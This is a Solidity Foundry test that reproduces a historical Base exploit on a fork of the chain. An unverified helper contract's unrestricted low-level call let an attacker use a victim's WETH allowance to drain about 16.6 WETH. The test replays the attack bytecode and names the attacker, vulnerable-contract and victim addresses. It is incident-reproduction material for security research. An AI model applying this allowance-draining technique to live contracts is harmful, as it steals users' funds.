// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~16.623 WETH (~$31k)
// Attacker  : 0xBDCe6BDd52bacEaDd1fC91BF01F3bc6AB24df17A
// Vulnerable: 0xA31722CA2a32695280d0E7e325b3dd6d699Fc170 (unverified Base helper)
// Victim    : 0x386218744a2053D949a1cafAE0b7B49a35e03F53 (WETH allowance holder)
// Attack tx : https://basescan.org/tx/0xe831f3991132cbaffbb4a3738da7d1e254a6c02f0adce605a333229a61e27ad7
// Alert     : https://x.com/SlowMist_Team/status/2083509411243299252
//
// Unverified helper exposes unrestricted low-level CALL (selector 0x42be3129)
// with no access control / target+calldata allowlist. Attacker deploys a one-shot
// that routes WETH.transferFrom(victim→attacker) through that CALL using the
// victim's existing allowance to the helper.
//
// PoC: fork Base one block before the attack; re-broadcast historical create bytecode.

address constant ATTACKER = 0xBDCe6BDd52bacEaDd1fC91BF01F3bc6AB24df17A;
address constant VULN = 0xA31722CA2a32695280d0E7e325b3dd6d699Fc170;
address constant VICTIM = 0x386218744a2053D949a1cafAE0b7B49a35e03F53;
address constant WETH = 0x4200000000000000000000000000000000000006;

uint256 constant FORK_BLOCK = 49_304_015;
uint256 constant EXPECTED_DRAIN = 16_623_029_776_956_898_128;

contract BaseUnverifiedArbitraryCall_a317_exp is BaseTestWithBalanceLog {
    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org"));
        vm.createSelectFork(rpc, FORK_BLOCK);
        fundingToken = WETH;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(VULN, "UnverifiedHelper");
        vm.label(VICTIM, "Victim");
        vm.label(WETH, "WETH");

        uint256 allowBefore = IERC20(WETH).allowance(VICTIM, VULN);
        require(allowBefore >= EXPECTED_DRAIN, "victim allowance too low");

        bytes memory createCode = vm.parseBytes(vm.readFile("calldata/attack_create.hex"));
        uint256 beforeBal = IERC20(WETH).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);
        address deployed;
        assembly {
            deployed := create(0, add(createCode, 0x20), mload(createCode))
        }
        require(deployed != address(0), "create failed");
        vm.stopPrank();

        uint256 profit = IERC20(WETH).balanceOf(ATTACKER) - beforeBal;
        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);
        emit log_named_address("Deployed attack contract", deployed);
        emit log_named_decimal_uint("Victim-vuln WETH allowance left", IERC20(WETH).allowance(VICTIM, VULN), 18);

        require(profit >= EXPECTED_DRAIN, "drain short");
    }
}
